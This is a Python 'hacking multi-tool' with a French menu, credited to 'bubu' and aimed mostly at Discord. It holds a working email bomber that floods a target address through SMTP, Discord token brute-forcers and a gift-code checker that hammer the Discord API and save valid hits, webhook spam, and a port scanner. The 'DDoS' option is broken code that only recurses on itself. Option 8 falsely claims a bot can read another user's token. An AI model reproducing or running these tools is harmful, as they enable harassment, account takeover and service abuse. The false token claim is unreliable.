import requests
import socket
import webbrowser
from discord_webhook import DiscordWebhook
from colorama import Fore, Style
import random
import string
import nmap
import threading
import os
from pystyle import Colors, Colorate


def ip_lookup(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return data
    else:
        return f"La recherche pour l'adresse IP {ip_address} a échoué. Veuillez réessayer plus tard."


def domain_lookup(domain_name):
    try:
        whois_info = socket.gethostbyname(domain_name)
        return whois_info
    except Exception as e:
        return f"La recherche pour le domaine {domain_name} a échoué. Veuillez réessayer plus tard."


def fetch_discord_user_info(user_id):
    print("Vous serez redirigé vers le site pour plus d'informations sur l'utilisateur Discord.")
    webbrowser.open('https://discordlookup.com/')


def osint_option():
    print("Vous serez redirigé vers le site OSINT Framework pour des outils d'enquête.")
    webbrowser.open('https://osintframework.com/')


def send_discord_webhook(webhook_url, message, codes):
    webhook = DiscordWebhook(url=webhook_url, content=message + " ".join(codes))
    webhook.execute()


def generate_nitro_codes(amount):
    codes = []
    for i in range(amount):
        code = "".join(random.choices(string.ascii_letters.upper() + string.digits, k=16))
        codes.append(code)
    return codes


def send_nitro_codes(webhook_url, codes):
    message = f"Codes générés avec succès : {len(codes)} "
    send_discord_webhook(webhook_url, message, codes)


def port_scan(target_host, target_ports):
    nm = nmap.PortScanner()
    nm.scan(target_host, target_ports)
    for host in nm.all_hosts():
        print('----------------------------------------------------')
        print(f'Host : {host} ({nm[host].hostname()})')
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print(f'Protocol : {proto}')
            lport = nm[host][proto].keys()
            for port in lport:
                print(f'port : {port}  state : {nm[host][proto][port]["state"]}')

def token_info(token):
    headers = {
        'Authorization': token
    }

    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

    if res.status_code == 200:
        res_json = res.json()

        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json.get('phone', "Non disponible")
        email = res_json.get('email', "Non disponible")
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']

        print(f"Nom d'utilisateur : {user_name}")
        print(f"ID utilisateur : {user_id}")
        print(f"Avatar : {avatar_url}")
        print(f"Numéro de téléphone : {phone_number}")
        print(f"Email : {email}")
        print(f"Authentification à deux facteurs activée : {mfa_enabled}")
        print(f"Drapeaux : {flags}")
        print(f"Localisation : {locale}")
        print(f"Compte vérifié : {verified}")
    else:
        print(f"Impossible de récupérer les informations. Code d'état : {res.status_code}")

def ddos(url):
    print(Colorate.Horizontal(Colors.blue_to_cyan, """
    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
    """) + Style.RESET_ALL)

    try:
        threads = int(input("Threads : "))
    except ValueError:
        print("Le nombre de threads est incorrect !")
        return

    if threads == 0:
        print("Le nombre de threads est incorrect !")
        return

    if not url.startswith("http"):
        print("L'URL ne commence pas par http ou https !")
        return

    if not "." in url:
        print("Domaine invalide !")
        return

    thread_list = []
    for i in range(0, threads):
        thr = threading.Thread(target=ddos, args=(url,))
        thread_list.append(thr)
        thr.start()
        print(str(i + 1) + " threads démarrés !")

    for thread in thread_list:
        thread.join()

    while True:
        print("\n1. Revenir à l'accueil")
        print("2. Quitter")
        back_choice = input("Entrez votre choix : ")

        if back_choice == "1":
            home()
            break
        elif back_choice == "2":
            os._exit(0)  # Ferme le programme immédiatement
        else:
            print("Option non reconnue. Retour à l'accueil.")

def home():
    print(Colorate.Horizontal(Colors.red_to_yellow, "       ..                         ..                   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, ". uW8\"                     . uW8\"                     "))
    print(Colorate.Horizontal(Colors.red_to_yellow, "`t888          x.    .     `t888          x.    .     "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 8888   .    .@88k  z88u    8888   .    .@88k  z88u   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 9888.z88N  ~\"8888 ^8888    9888.z88N  ~\"8888 ^8888   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 9888  888E   8888  888R    9888  888E   8888  888R   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 9888  888E   8888  888R    9888  888E   8888  888R   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 9888  888E   8888  888R    9888  888E   8888  888R   "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " 9888  888E   8888 ,888B .  9888  888E   8888 ,888B . "))
    print(Colorate.Horizontal(Colors.red_to_yellow, ".8888  888\"  \"8888Y 8888\"  .8888  888\"  \"8888Y 8888\"  "))
    print(Colorate.Horizontal(Colors.red_to_yellow, " `%888*%\"     `Y\"   'YP     `%888*%\"     `Y\"   'YP    "))
    print(Colorate.Horizontal(Colors.red_to_yellow, "    \"`                         \"`                   "))
    print(Colorate.Horizontal(Colors.rainbow, "[Ce tool a été développé par bubu]"))

    print(Colorate.Horizontal(Colors.red_to_yellow, "1. IP Lookup"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "2. Recherche WHOIS sur un nom de domaine"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "3. Recherche d'informations utilisateur Discord par ID"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "4. OSINT Framework - Outils d'enquête"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "5. Envoyer un message via un webhook Discord"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "6. Générer des codes Nitro Discord"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "7. Générer des tokens Discord"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "8. Trouver le début du token d'un utilisateur Discord par ID"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "9. Rechercher tous les réseaux sociaux associés à un pseudo"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "10. Scanner les port d'une machine"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "11. Token info"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "12. DDoS"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "13. Mail bomber"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "14. Brute force token"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "15. Nitro checker"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "16. Token gen/cracker"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "17. Quitter"))

if __name__ == '__main__':
    while True:
        home()
        choice = input("Entrez votre choix : ")

        if choice == "1":
            ip = input("Entrez l'adresse IP : ")
            results = ip_lookup(ip)
            print(results)
        elif choice == "2":
            domain = input("Entrez le nom de domaine : ")
            results = domain_lookup(domain)
            print(results)
        elif choice == "3":
            user_id = input("Entrez l'ID de l'utilisateur Discord : ")
            fetch_discord_user_info(user_id)
        elif choice == "4":
            osint_option()
        elif choice == "5":
            webhook_url = input("Entrez l'URL du webhook Discord : ")
            message = input("Entrez le message à envoyer : ")
            repeat = input("Entrez le nombre de fois à répéter : ")
            send_discord_webhook(webhook_url, message, repeat)
        elif choice == "6":
            webhook_url = input("Entrez l'URL du webhook Discord : ")
            amount = int(input("Entrez le nombre de codes Nitro à générer : "))
            codes = generate_nitro_codes(amount)
            send_nitro_codes(webhook_url, codes)
        elif choice == "7":
            token_amount = int(input("Entrez le nombre de tokens à générer : "))
            tokens = ["".join(random.choices(string.ascii_letters + string.digits, k=59)) for _ in range(token_amount)]
            print(f"Tokens générés avec succès : {tokens}")
        elif choice == "8":
            with open("instructions.txt", "w") as file:
                file.write("""
                1. Télécharger d'abord pour PC visual studio code / replit sur téléphone
                2. Une fois fais ouvrez un nouveau fichier dans laquelle vous allez rentrer les commandes suivantes :
                import discord
                from discord.ext import commands

                intents = discord.Intents.default()
                intents.typing = False
                intents.presences = False

                bot = commands.Bot(command_prefix='!', intents=intents)

                @bot.command()
                async def find_token(ctx, user_id: int):
                    user = await bot.fetch_user(user_id)
                    token = user.__dict__.get('token', None)
                    if token:
                        print(f"The beginning of the token for the user with ID {user_id} is: {token[:10]}")
                    else:
                        print(f"Token not found for the user with ID {user_id}")

                bot.run('YOUR_DISCORD_BOT_TOKEN')

                3. Remplacer YOUR_DISCORD_BOT_TOKEN par le token de votre bot discord
                4. Lancer le code
                5. Une fois que c'est fait faites la commande !find_token <user_id>
                6. En cas de problème vous pouvez toujours contacter bubu sur discord
                """)
            print("Instructions téléchargées avec succès. Veuillez consulter le fichier 'instructions.txt'.")
        elif choice == "9":
            webbrowser.open("https://whatsmyname.app/")
        elif choice == "10":
            target_host = input("Entrez l'adresse IP de la machine à scanner : ")
            target_ports = input("Entrez les ports à scanner (séparés par une virgule pour plusieurs ports) : ")
            port_scan(target_host, target_ports)
        elif choice == "11":
            token = input("Entrez votre token Discord : ")
            token_info(token)
        elif choice == "12":
            url = input("Entrez l'URL cible >> ")
            ddos(url)
        elif choice == "13":
            import smtplib
            import sys

            class bcolors:
                GREEN = '\033[92m'
                YELLOW = '\033[93m'
                RED = '\033[91m'

            def banner():
                print(bcolors.GREEN + '''Email-bomber''')

            class Email_Bomber:
                count = 0

                def __init__(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
                        self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
                        self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                        if int(self.mode) > int(4) or int(self.mode) < int(1):
                            print('ERROR: Invalid Option. GoodBye.')
                            sys.exit(1)
                    except Exception as e:
                        print(f'ERROR: {e}')

                def bomb(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
                        self.amount = None
                        if self.mode == int(1):
                            self.amount = int(1000)
                        elif self.mode == int(2):
                            self.amount = int(500)
                        elif self.mode == int(3):
                            self.amount = int(250)
                        else:
                            self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
                        print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def email(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
                        self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo                        3:Outlook <: '))
                        premade = ['1', '2', '3']
                        default_port = True
                        if self.server not in premade:
                            default_port = False
                            self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                        if default_port == True:
                            self.port = int(587)

                        if self.server == '1':
                            self.server = 'smtp.gmail.com'
                        elif self.server == '2':
                            self.server = 'smtp.mail.yahoo.com'
                        elif self.server == '3':
                            self.server = 'smtp-mail.outlook.com'

                        self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
                        self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
                        self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
                        self.message = str(input(bcolors.GREEN + 'Enter message <: '))

                        self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

                        self.s = smtplib.SMTP(self.server, self.port)
                        self.s.ehlo()
                        self.s.starttls()
                        self.s.ehlo()
                        self.s.login(self.fromAddr, self.fromPwd)
                    except Exception as e:
                        print(f'ERROR: {e}')

                def send(self):
                    try:
                        self.s.sendmail(self.fromAddr, self.target, self.msg)
                        self.count += 1
                        print(bcolors.YELLOW + f'BOMB: {self.count}')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def attack(self):
                    print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
                    for email in range(self.amount + 1):
                        self.send()
                    self.s.close()
                    print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
                    sys.exit(0)

            banner()
            bomb = Email_Bomber()
            bomb.bomb()
            bomb.email()
            bomb.attack()

        elif choice == "14":
            import base64
            import os
            import random
            import string
            import requests
            from colorama import Fore

            id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
            id_to_token = str(id_to_token)[2:-1]

            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
                headers={
                    'Authorization': token
                }
                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(Fore.GREEN + '[+] VALID' + ' ' + token)
                        f = open('hit.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(Fore.RED + '[-] INVALID' + ' ' + token)
                finally:
                    print("")

        elif choice == "15":
            import os
            import ctypes
            import requests
            import random
            import string
            import time

            print(Colorate.Horizontal(Colors.red_to_purple, """

                   oo   dP                              dP                         dP                         
              88                              88                         88                         
88d888b. dP d8888P 88d888b. .d8888b. .d8888b. 88d888b. .d8888b. .d8888b. 88  .dP  .d8888b. 88d888b. 
88'  `88 88   88   88'  `88 88'  `88 88'  `"" 88'  `88 88ooood8 88'  `"" 88888"   88ooood8 88'  `88 
88    88 88   88   88       88.  .88 88.  ... 88    88 88.  ... 88.  ... 88  `8b. 88.  ... 88       
dP    dP dP   dP   dP       `88888P' `88888P' dP    dP `88888P' `88888P' dP   `YP `88888P' dP                       
     
                                
            ╔═══════════════════════╦══════════════════════════╦═══════════════════════╗
            ║  Dev : Bubu   ║  Info  : Nitro Generator ║  Programm  : Option 15   ║
            ╚═══════════════════════╩══════════════════════════╩═══════════════════════╗
            
"""))

            time.sleep(0.1)
            print(Colorate.Horizontal(Colors.red_to_purple, "Générateur de nitro"))
            time.sleep(0.1)
            print(Colorate.Horizontal(Colors.red_to_purple, "Crée par bubu .\n"))
            time.sleep(0.1)

            num = int(input(Colorate.Horizontal(Colors.red_to_purple, 'Input How Many Codes to Generate and Check: ')))
            with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
                print(Colorate.Horizontal(Colors.red_to_purple, "Please wait ..."))

                start = time.time()

                for i in range(num):
                    code = "".join(random.choices(
                        string.ascii_uppercase + string.digits + string.ascii_lowercase,
                        k = 16
                    ))

                    file.write(f"https://discord.gift/{code}\n")


                print(Colorate.Horizontal(Colors.red_to_purple, f"Generated {num} codes | Time taken: {time.time() - start}\n"))

            with open("Nitro Codes.txt") as file:
                for line in file.readlines():
                    nitro = line.strip("\n")

                    url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

                    r = requests.get(url)

                    if r.status_code == 200:
                        print(Colorate.Horizontal(Colors.red_to_purple, f" Valid | {nitro} "))
                        break
                    else:
                        print(Colorate.Horizontal(Colors.red_to_purple, f" Invalid | {nitro} "))



            print("Discord : soon\n")

            time.sleep(0.2)

            input(Colorate.Horizontal(Colors.red_to_purple, "\nCodes generated !! If Valide codes.txt is empty retry to gen 20 millions code ;) "))
        elif choice == "16":
            import random
            import string
            import time

            import requests
            from colorama import Fore, Style
            print(Colorate.Horizontal(Colors.green_to_blue, """ 
            ::::::::::::   ...      :::  .   .,:::::::::.    :::.  .,-::::: :::::::..    :::.       .,-:::::  :::  .   .,:::::: :::::::..   
            ;;;;;;;;''''.;;;;;;;.   ;;; .;;,.;;;;''''`;;;;,  `;;;,;;;'````' ;;;;``;;;;   ;;`;;    ,;;;'````'  ;;; .;;,.;;;;'''' ;;;;``;;;;  
            [[    ,[[     \\[[, [[[[[/'   [[cccc   [[[[[. '[[[[[         [[[,/[[['  ,[[ '[[,  [[[         [[[[[/'   [[cccc   [[[,/[[['  
            $$    $$$,     $$$_$$$$,     $$\"\"\"\"   $$$ \"Y$c$$$$$         $$$$$$c   c$$$cc$$$c $$$        _$$$$,     $$\"\"\"\"   $$$$$$c   
            88,   \"888,_ _,88P\"888\"88o,  888oo,__ 888    Y88`88bo,__,o, 888b \"88bo,888   888,`88bo,__,o,\"888\"88o,  888oo,__ 888b \"88bo,    
            MMM     \"YMMMMMP\"  MMM \"MMP\" \"\"\"\"YUMMMMMM     YM  \"YUMMMMMP\"MMMM   \"W\" YMM   \"\"`   \"YUMMMMMP\"MMM \"MMP\" \"\"\"\"YUMMMMMMM   \"W\" 
            """))

                         
            attempts_per_second = 7  

            def getheaders(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers

            def mfa_crack():
                token = (f"mfa.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(84)))}")

                r = requests.get(
                    'https://discord.com/api/v9/users/@me',
                    headers=getheaders(token))

                if r.status_code == 200:
                    print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n" + Style.RESET_ALL)

                    with open("valid-token.txt", "a") as f:
                        f.write(f"\n{token}\n")

                elif r.status_code == 401:
                    print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n" + Style.RESET_ALL)

                elif r.status_code == 429:
                    print(Fore.YELLOW + f"- Rate limit exceded!\n" + Style.RESET_ALL)
                    exit()

                else:
                    print(Fore.YELLOW + f"Unknown error code thrown. Exiting . . . | [{r.status_code}]" + Style.RESET_ALL)
                    exit()

            def reg_crack():
                token = (f"{(''.join(random.choice(string.hexdigits) for _ in range(24)))}.{(''.join(random.choice(string.hexdigits) for _ in range(6)))}.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(27)))}")

                r = requests.get(
                    'https://discord.com/api/v9/users/@me',
                    headers=getheaders(token))

                if r.status_code == 200:
                    print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n" + Style.RESET_ALL)
                    with open("valid-token.txt", "a") as f:
                        f.write(f"\n{token}\n")

                elif r.status_code == 401:
                    print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n" + Style.RESET_ALL)

                elif r.status_code == 429:
                    print(Fore.YELLOW + f"- Rate limit exceded!\n" + Style.RESET_ALL)
                    exit()

                else:
                    print(Fore.YELLOW + f"Unknown code thrown. Exiting . . . [{r.status_code}]" + Style.RESET_ALL)
                    exit()

            def main():
                print("made by bubu\nsoon \n")
                delay = (1 / attempts_per_second)
                print(f"Delay (seconds): {delay}\nAttempts per second: {attempts_per_second}\n")
                choice = str(input("[1] Non MFA tokens (quicker to crack)\n[2] MFA tokens (longer to crack)\n>>> "))

                if choice == '1':
                    while True:
                        reg_crack()
                        time.sleep(delay)

                if choice == '2':
                    while True:
                        mfa_crack()
                        time.sleep(delay)


                else:
                    exit()

            if __name__ == "__main__":
                f = open("valid-token.txt", "w")

                try:
                    main()
                except KeyboardInterrupt:
                    print(Style.RESET_ALL + '\n\nKeyboardInterrupt\nClosing . . .')


        else:
            print("Option non reconnue. Veuillez choisir une option valide.")

        print("\n1. Revenir à l'accueil")
        print("2. Quitter")
        back_choice = input("Entrez votre choix : ")

        if back_choice == "2":
            break
        elif back_choice != "1":
            print("Option non reconnue. Retour à l'accueil.")
